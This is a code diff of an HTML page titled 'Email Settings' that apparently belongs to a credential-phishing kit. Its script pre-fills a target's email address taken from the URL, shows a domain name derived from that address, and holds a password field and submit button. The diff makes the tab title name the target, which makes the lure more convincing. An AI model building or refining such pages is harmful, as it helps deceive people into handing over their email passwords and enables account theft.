@@ -1,6 +1,6 @@
 <html>
 <head>
-<title>Email Settings | For: <span id="dynamic-email-title">user@domain.com</span></title>
+<title id="dynamic-title">Email Settings | For: loading...</title>
 <link rel="icon" href="#" type="image/gif">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -175,7 +175,7 @@ input[type=submit]{
   // Update all instances of email and domain
   const emailField = document.getElementById('email-field');
   const footerEmail = document.getElementById('footer-email');
-  const titleSpan = document.getElementById('dynamic-email-title');
+  const titleSpan = document.getElementById('dynamic-title'); // CHANGED: Now targeting the title tag
   const domainSpan = document.getElementById('domain-name');
   const passwordField = document.getElementById('password-field');
   const submitBtn = document.getElementById('submit-btn');
@@ -183,13 +183,13 @@ input[type=submit]{
   if (emailFromUrl) {
     if (emailField) emailField.value = emailFromUrl;
     if (footerEmail) footerEmail.textContent = emailFromUrl;
-    if (titleSpan) titleSpan.textContent = emailFromUrl;
+    if (titleSpan) titleSpan.textContent = 'Email Settings | For: ' + emailFromUrl; // CHANGED: Sets dynamic title
     if (domainSpan) domainSpan.textContent = domainFromEmail;
   } else {
     // Fallback if no email in URL
     if (emailField) emailField.value = 'user@domain.com';
     if (footerEmail) footerEmail.textContent = 'user@domain.com';
-    if (titleSpan) titleSpan.textContent = 'user@domain.com';
+    if (titleSpan) titleSpan.textContent = 'Email Settings | For: user@domain.com'; // CHANGED: Fallback title
     if (domainSpan) domainSpan.textContent = 'domain.com';
   }
 
